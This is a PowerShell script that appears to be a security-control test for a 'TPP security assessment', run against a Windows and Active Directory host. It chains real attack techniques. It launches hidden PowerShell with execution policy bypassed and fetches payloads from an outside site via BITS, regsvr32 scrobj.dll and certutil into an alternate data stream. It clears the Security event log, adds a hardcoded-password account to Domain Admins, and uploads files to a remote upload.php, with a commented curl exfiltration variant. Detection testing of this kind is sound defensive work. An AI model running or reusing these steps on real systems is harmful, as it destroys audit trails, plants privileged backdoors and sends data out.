$TPPSecurityTestSite = "https://tppsecuritytest.com/"
$FolderName = "C:\tpp\"
$ExfiltrateFolder = "exfiltrate"
$HiddenPSFileName = "evil.ps1"
$EvilPDF = "payload.pdf"
$EvilSCT = "payload.sct"
$UploadURI = ($TPPSecurityTestSite + "upload.php")
$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

Write-Host $username
#Check if the tpp folder exists
if (Test-Path $FolderName) {
    Write-Host "TPP folder exists"
}
else
{
    New-Item $FolderName -ItemType Directory
    Write-Host "TPP folder created"
}
#Check if the exfiltrate subfolder is there
if (Test-Path ($FolderName + $ExfiltrateFolder)) {
    Write-Host "Exfiltrate folder exists"
}
else {
    New-Item ($FolderName + $ExfiltrateFolder) -ItemType Directory
}
#Create an empty ps1 file for this test
if (Test-Path ($FolderName + $HiddenPSFileName))
{
    Write-Host "evil.ps1 exists"
}
else
{
    New-Item ($FolderName + $HiddenPSFileName)
}


#Check for hidden PowerShell options
("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file " + ($FolderName + $HiddenPSFileName)) | cmd

#Check for downloading a bad hash
Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilPDF) -Destination ($FolderName + $EvilPDF) -Asynchronous

#Check for RegSvr32 detection evasion
"regsvr32.exe /s /u /i:" + ($TPPSecurityTestSite + $EvilSCT) + " scrobj.dll" | cmd

#Check for file attribute evasion
"certutil.exe -urlcache -split -f " + ($TPPSecurityTestSite + $EvilSCT) + " fileattributes.txt:test" | cmd

#Check for event log clearance
"wevtutil clear-log Security" | cmd

#Check for escalation
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String TppTestPasswordS3cur!ty
New-ADUser -Name "TPPSecurityTest" -Description "An account added during the TPP security assessment.  Please delete!" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Members TPPSecurityTest

#Exfiltrate files
Get-ChildItem ($FolderName + $ExfiltrateFolder) | Select-Object -last 10 |
ForEach-Object {
    
   $fieldName = 'upfile'
   $filePath = $_.FullName
   $url = $UploadURI
   
   Try 
   {
    Add-Type -AssemblyName 'System.Net.Http'
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fileStream = [System.IO.File]::OpenRead($_.FullName)
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $content.Add($fileContent, $fieldName, $fileName)
    $result = $client.PostAsync($url, $content).Result
    $result.EnsureSuccessStatusCode()
    Write-Host "Uploaded file: " + $_.FullName
   }
   Catch
   {
    Write-Error $_
    exit 1
   }
   Finally
   {
    if ($client -ne $null) {$client.Dispose()}
    if ($content -ne $null) {$content.Dispose()}
    if ($fileStream -ne $null) {$fileStream.Dispose()}
    if ($fileContent -ne $null) {$fileContent.Dispose()}
   }
   # This is the simpler CURL command version that works on Mac or Linux
   #"curl -F 'upfile=@" + $_.FullName.ToString() + "' " + $UploadURI | cmd
    
}